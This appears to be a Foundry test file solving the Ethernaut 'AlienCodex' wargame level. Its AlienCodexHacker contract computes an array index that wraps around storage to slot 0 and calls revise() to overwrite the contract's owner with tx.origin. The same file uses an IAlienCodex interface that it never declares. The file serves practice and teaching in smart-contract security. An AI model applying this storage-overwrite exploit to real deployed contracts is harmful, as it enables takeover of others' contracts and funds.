// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";

import {AlienCodex} from "../src/AlienCodex.sol";

contract AlienCodexTest is Test {
    AlienCodex target;

    function setUp() public {
        target = new AlienCodex();
    }

    function test_Revise() public {
        AlienCodexHacker hackTarget = new AlienCodexHacker(address(target));
    }
}

contract AlienCodexHacker {
    constructor(address target) {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        IAlienCodex(target).revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}
